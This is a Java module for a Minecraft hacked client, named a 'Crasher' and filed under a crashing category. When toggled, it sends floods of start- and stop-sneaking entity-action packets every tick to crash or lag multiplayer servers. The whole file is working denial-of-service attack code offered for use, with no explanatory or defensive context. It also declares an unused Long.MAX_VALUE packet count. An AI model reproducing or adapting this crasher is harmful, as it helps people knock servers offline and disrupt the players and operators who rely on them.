package dev.o2w9d8.client.module.crashing;

import net.minecraft.client.Minecraft;
import net.minecraft.entity.Entity;
import net.minecraft.network.play.client.C0BPacketEntityAction;

import org.lwjgl.input.Keyboard;
import dev.o2w9d8.client.module.Category;
import dev.o2w9d8.client.module.Module;

public class SneakingCModule extends Module {

	private static final long PACKET_COUNT = Long.MAX_VALUE; // Number of packets to send

	public SneakingCModule() {
		super("2w9d8_Crasher-Sneaking", Keyboard.KEY_N, Category.CRASHING);
	}

	@Override
	public void onUpdate() {
		if (this.isToggled()) {
			sendPackets();
		}
	}

	private void sendPackets() {
		Entity targetEntity = Minecraft.getMinecraft().thePlayer; // Target entity (in this case, the player)

		for (long i = -15; i < 16; i++) {
			sendEntityActionPacket(C0BPacketEntityAction.Action.START_SNEAKING, targetEntity);
			sendEntityActionPacket(C0BPacketEntityAction.Action.STOP_SNEAKING, targetEntity);
		}
	}

	private void sendEntityActionPacket(C0BPacketEntityAction.Action action, Entity targetEntity) {
		Minecraft minecraft = Minecraft.getMinecraft();
		C0BPacketEntityAction packet = new C0BPacketEntityAction(targetEntity, action);
		minecraft.getNetHandler().addToSendQueue(packet);
	}
}
